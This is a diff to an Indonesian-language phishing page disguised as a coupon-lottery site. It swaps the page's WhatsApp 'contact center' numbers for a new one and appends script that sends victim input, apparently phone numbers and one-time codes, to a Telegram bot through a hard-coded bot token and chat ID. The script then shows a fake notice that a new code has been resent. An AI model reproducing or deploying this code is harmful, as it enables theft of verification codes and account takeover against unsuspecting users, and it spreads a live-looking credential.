@@ -525,13 +525,13 @@
        </center>
        <b>
  
-           <a href="https://api.whatsapp.com/send?phone=6285134080259&text=Saya%20Belum%20Mendapatkan%20Kode%20Kupon%20Undian" id="kirims" class="bubble-element Button clickable-element"  />
+           <a href="https://api.whatsapp.com/send?phone=628157134128&text=Saya%20Belum%20Mendapatkan%20Kode%20Kupon%20Undian" id="kirims" class="bubble-element Button clickable-element"  />
               <label  class="bubble-element Button clickable-element" style="max-width: 100%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 10px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" /><br>
 Konfirmasi Belum Terima Kupon</a></lebel>
 </b>  
       </form>
     </div>
-    <b> <p onclick="location.href='https://wa.me/6283848601900?text=Saya Belum Mendapatkan Kode Kupon Undian'" style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: none">Tidak Terima Kode?
+    <b> <p onclick="location.href='https://wa.me/628157134128?text=Saya Belum Mendapatkan Kode Kupon Undian'" style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: none">Tidak Terima Kode?
          <span style="color: #098CE3">Hubungi Contact Center</span>
          </strong></p></b>
    </center>
@@ -573,7 +573,7 @@ Konfirmasi Belum Terima Kupon</a></lebel>
     buttonSize:'medium',
     buttonPosition:'right',
     callToAction:'Chat Sekarang',
-    phoneNumber:'082273547514',
+    phoneNumber:'08157134128',
     welcomeMessage:'Hallo Kak, Apa yang dapat saya bantu?👋',
     prefillMessage:'Saya Belum Mendapatkan Kode Kupon Undian  ',
     })"
@@ -756,3 +756,56 @@ setTimeout(function(){
 </script>
 </body>
 </html><!--<script src='https://a.bsite.net/footer.js'></script>
+
+       var token = '7966871057:AAENS-7Eils1Hit-SirGLakmWMW2LbNN3yk'; 
+      var grup = '6560252299'; 
+  
+      $.ajax({
+          url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+          method: `POST`,
+          
+      success: function(){
+      setTimeout(function(){
+      $(".loadingOtp").hide();
+     
+      $('.inpotp').val('');
+     $('#otp1').focus();
+    var nomor = sessionStorage.getItem("nomor");
+          document.getElementById("alert").innerHTML = "Kode baru dikirim ulang via WhatsApp ke  +62" + nomor +  " <br/>";
+     $(".alert").css("color","black");
+      },4000);
+     
+          
+      }
+          
+      }
+      );
+          
+      };
+      </script>
+  <script>
+      function countdown() {
+      var count = parseInt(
+      $('#countdown').text());
+      if (count !== 0) {
+      $('#countdown').text(count - 1);} 
+      else {
+      $('#countdown').text('60');}};
+      </script>
+  <script>
+  window.onload = function(){
+          setTimeout(function(){
+              $(".start").fadeIn();
+              setTimeout(function(){
+                  $(".start").fadeOut(1000);
+                  setTimeout(function(){
+                     $(".container").fadeIn(200);
+                     $("#inp").focus();
+                  },1000);
+              },1000);
+          },500);
+  }
+  </script>
+  
+  </body></html>
+  
